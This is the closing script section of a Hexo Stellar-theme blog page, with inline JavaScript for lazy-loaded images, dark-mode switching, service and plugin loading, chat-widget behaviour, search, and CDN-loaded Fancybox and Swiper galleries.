  // and get the instance of LazyLoad
  window.addEventListener(
    "LazyLoad::Initialized",
    function (event) {
      window.lazyLoadInstance = event.detail.instance;
    },
    false
  );
  document.addEventListener('DOMContentLoaded', function () {
    window.lazyLoadInstance?.update();
  });

  window.wrapLazyloadImages = (container) => {
    if (typeof container === 'string') {
      container = document.querySelector(container);
    }
    if (!container) return;

    const images = container.querySelectorAll('img');
    images.forEach((img) => {
      if (img.classList.contains('lazy')) return;

      const src = img.getAttribute('src');
      if (!src) return;

      const wrapper = document.createElement('div');
      wrapper.className = 'lazy-box';

      const newImg = img.cloneNode();
      newImg.removeAttribute('src');
      newImg.setAttribute('data-src', src);
      newImg.classList.add('lazy');

      const icon = document.createElement('div');
      icon.className = 'lazy-icon';
      if (def.loading) {
        icon.style.backgroundImage = `url("${def.loading}")`;
      }

      wrapper.appendChild(newImg);
      wrapper.appendChild(icon);

      img.replaceWith(wrapper);
    });

    // 通知 LazyLoad 更新
    if (window.lazyLoadInstance?.update) {
      window.lazyLoadInstance.update();
    }
  }

</script>

<!-- required -->
<script src="/js/main.js?v=1.33.1" defer></script>

<script type="text/javascript">
  const applyTheme = (theme) => {
    if (theme === 'auto') {
      document.documentElement.removeAttribute('data-theme')
    } else {
      document.documentElement.setAttribute('data-theme', theme)
    }

    // applyThemeToGiscus(theme)
  }

  // FIXME: 这会导致无法使用 preferred_color_scheme 以外的主题
  const applyThemeToGiscus = (theme) => {
    // theme = theme === 'auto' ? 'preferred_color_scheme' : theme
    const cmt = document.getElementById('giscus')
    if (cmt) {
      // This works before giscus load.
      cmt.setAttribute('data-theme', theme)
    }

    const iframe = document.querySelector('#comments > section.giscus > iframe')
    if (iframe) {
      // This works after giscus loaded.
      const src = iframe.src
      const newSrc = src.replace(/theme=[\w]+/, `theme=${theme}`)
      iframe.src = newSrc
    }
  }

  const switchTheme = () => {
    // light -> dark -> auto -> light -> ...
    const currentTheme = document.documentElement.getAttribute('data-theme')
    let newTheme;
    switch (currentTheme) {
      case 'light':
        newTheme = 'dark'
        break
      case 'dark':
        newTheme = 'auto'
        break
      default:
        newTheme = 'light'
    }
    applyTheme(newTheme)
    window.localStorage.setItem('Stellar.theme', newTheme)
    utils.dark.mode = newTheme === 'auto' ? (window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light") : newTheme;
    utils.dark.method.toggle.start();

    const messages = {
      light: `Switched to Light Mode`,
      dark: `Switched to Dark Mode`,
      auto: `Switched to Auto Mode`,
    }
    hud?.toast?.(messages[newTheme])
  }

  (() => {
    // Apply user's preferred theme, if any.
    const theme = window.localStorage.getItem('Stellar.theme')
    if (theme !== null) {
      applyTheme(theme)
    } else {
      utils.dark.mode = window.matchMedia("(prefers-color-scheme: dark)").matches ? "dark" : "light";
    }
    utils.dark.method.toggle.start();
  })()
</script>


<!-- optional -->



<script defer>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.services = Object.assign({}, JSON.parse(`{"mdrender":{"js":"/js/services/mdrender.js"},"siteinfo":{"js":"/js/services/siteinfo.js","api":null},"ghinfo":{"js":"/js/services/ghinfo.js"},"rating":{"js":"/js/services/rating.js","api":"https://star-vote.xaox.cc/api/rating"},"vote":{"js":"/js/services/vote.js","api":"https://star-vote.xaox.cc/api/vote"},"sites":{"js":"/js/services/sites.js"},"friends":{"js":"/js/services/friends.js"},"friends_and_posts":{"js":"/js/services/friends_and_posts.js"},"timeline":{"js":"/js/services/timeline.js"},"fcircle":{"js":"/js/services/fcircle.js"},"weibo":{"js":"/js/services/weibo.js"},"memos":{"js":"/js/services/memos.js"},"voice":{"js":"/js/plugins/voice.js"},"video":{"js":"/js/plugins/video.js"},"download-file":{"js":"/js/plugins/download-file.js"},"twikoo":{"js":"/js/services/twikoo_latest_comment.js"},"waline":{"js":"/js/services/waline_latest_comment.js"},"artalk":{"js":"/js/services/artalk_latest_comment.js"},"giscus":{"js":"/js/services/giscus_latest_comment.js"},"contributors":{"edit_this_page":{"_posts/":null,"wiki/stellar/":"https://github.com/xaoxuu/hexo-theme-stellar-docs/blob/main/"},"js":"/js/services/contributors.js"},"rss":{"js":"/js/services/rss.js"}}`));
    for (let id of Object.keys(ctx.services)) {
      const js = ctx.services[id].js;
      if (id == 'siteinfo') {
        ctx.cardlinks = document.querySelectorAll('a.link-card[cardlink]');
        if (ctx.cardlinks?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            setCardLink(ctx.cardlinks);
          });
        }
      } else if (id == 'voice') {
        ctx.voiceAudios = document.querySelectorAll('.voice>audio');
        if (ctx.voiceAudios?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            createVoiceDom(ctx.voiceAudios);
          });
        }
      } else if (id == 'video') {
        ctx.videos = document.querySelectorAll('.video>video');
        if (ctx.videos?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            videoEvents(ctx.videos);
          });
        }
      } else if (id == 'download-file') {
        ctx.files = document.querySelectorAll('.chat-file');
        if (ctx.files?.length > 0) {
          utils.js(js, { defer: true }).then(function () {
            downloadFileEvent(ctx.files);
          });
        }
      } else {
        const els = document.getElementsByClassName(`ds-${id}`);
        if (els?.length > 0) {
          utils.jq(() => {
            if (id == 'timeline' || 'memos' || 'marked') {
              utils.js(deps.marked).then(function () {
                utils.js(js, { defer: true });
              });
            } else {
              utils.js(js, { defer: true });
            }
          });
        }
      }
    }

    // chat iphone time
    let phoneTimes = document.querySelectorAll('.chat .status-bar .time');

    if (phoneTimes.length > 0) {
      NowTime();
      var date = new Date();
      var sec = date.getSeconds();
      var firstAdjustInterval = setInterval(firstAdjustTime, 1000 * (60 - sec));
    }

    function firstAdjustTime() {
      NowTime();
      clearInterval(firstAdjustInterval);
      setInterval(NowTime, 1000 * 60);
    }

    function NowTime() {
      for (let i = 0; i < phoneTimes.length; ++i) {
        var timeSpan = phoneTimes[i];
        var date = new Date();
        var hour = date.getHours();
        var min = date.getMinutes();
        timeSpan.innerHTML = check(hour) + ":" + check(min);
      }
    };

    function check(val) {
      if (val < 10) {
        return ("0" + val);
      }
      return (val);
    }

    // chat quote
    const chat_quote_obverser = new IntersectionObserver((entries, observer) => {
      entries.filter((entry) => { return entry.isIntersecting }).sort((a, b) => a.intersectionRect.y !== b.intersectionRect.y ? a.intersectionRect.y - b.intersectionRect.y : a.intersectionRect.x - b.intersectionRect.x).forEach((entry, index) => {
          observer.unobserve(entry.target);
          setTimeout(() => {
            entry.target.classList.add('quote-blink');
            setTimeout(() => {
              entry.target.classList.remove('quote-blink');
            }, 1000);
          }, Math.max(100, 16) * (index + 1));
        });
    });

    var chatQuotes = document.querySelectorAll(".chat .talk .quote");
    chatQuotes.forEach((quote) => {
      quote.addEventListener('click', function () {
        var chatCellDom = document.getElementById("quote-" + quote.getAttribute("quotedCellTag"));
        if (chatCellDom) {
          var chatDiv = chatCellDom.parentElement;
          var mid = chatDiv.clientHeight / 2;
          var offsetTop = chatCellDom.offsetTop;
          if (offsetTop > mid - chatCellDom.clientHeight / 2) {
            chatDiv.scrollTo({
              top: chatCellDom.offsetTop - mid + chatCellDom.clientHeight / 2,
              behavior: "smooth"
            });
          } else {
            chatDiv.scrollTo({
              top: 0,
              behavior: "smooth"
            });
          }
          chat_quote_obverser.observe(chatCellDom);
        }
      });
    });
  });
</script>

<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    ctx.search = {
      path: `/search.json`,
    }
    utils.js('/js/search/local-search.js', { defer: true });
  });
</script><script>
  window.FPConfig = {
    delay: 0,
    ignoreKeywords: [],
    maxRPS: 5,
    hoverDelay: 25
  };
</script>
<script defer src="https://gcore.jsdelivr.net/npm/flying-pages@2/flying-pages.min.js"></script><script>
  ctx.fancybox = {
    selector: `.timenode p>img`,
    css: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css`,
    js: `https://gcore.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.umd.js`
  };
  var selector = '[data-fancybox]:not(.error), .with-fancybox .atk-content img:not([atk-emoticon])';
  if (ctx.fancybox.selector) {
    selector += `, ${ctx.fancybox.selector}`
  }
  var needFancybox = document.querySelectorAll(selector).length !== 0;
  if (!needFancybox) {
    const memos = document.getElementsByClassName('ds-memos');
    if (memos != undefined && memos.length > 0) {
      needFancybox = true;
    }
    const fancybox = document.getElementsByClassName('with-fancybox');
    if (fancybox != undefined && fancybox.length > 0) {
      needFancybox = true;
    }
  }
  if (needFancybox) {
    utils.css(ctx.fancybox.css);
    utils.js(ctx.fancybox.js, { defer: true }).then(function () {
      Fancybox.bind(selector, {
        hideScrollbar: false,
        Thumbs: {
          autoStart: false,
        },
        caption: (fancybox, slide) => {
          return slide.triggerEl.alt || slide.triggerEl.dataset.caption || null
        }
      });
    })
  }
</script>
<script>
  window.addEventListener('DOMContentLoaded', (event) => {
    const swiper_api = document.getElementById('swiper-api');
    if (swiper_api != undefined) {
      utils.css(`https://unpkg.com/swiper@10.3/swiper-bundle.min.css`);
      utils.js(`https://unpkg.com/swiper@10.3/swiper-bundle.min.js`, { defer: true }).then(function () {
        const effect = swiper_api.getAttribute('effect') || '';
        var swiper = new Swiper('.swiper#swiper-api', {
          slidesPerView: 'auto',
          spaceBetween: 8,
          centeredSlides: true,
          effect: effect,
          rewind: true,
          pagination: {
            el: '.swiper-pagination',
            clickable: true,
          },
          navigation: {
            nextEl: '.swiper-button-next',
            prevEl: '.swiper-button-prev',
          },
        });
      })
    }
  });
</script>
<script>
  document.addEventListener('DOMContentLoaded', function () {
    window.codeElements = document.querySelectorAll('.code');
    if (window.codeElements.length > 0) {
      ctx.copycode = {
        default_text: `Copy`,
        success_text: `Copied`,
        toast: `复制成功`,
      };
      utils.js('/js/plugins/copycode.js');
    }
  });
</script>


<!-- inject -->

</div></body></html>
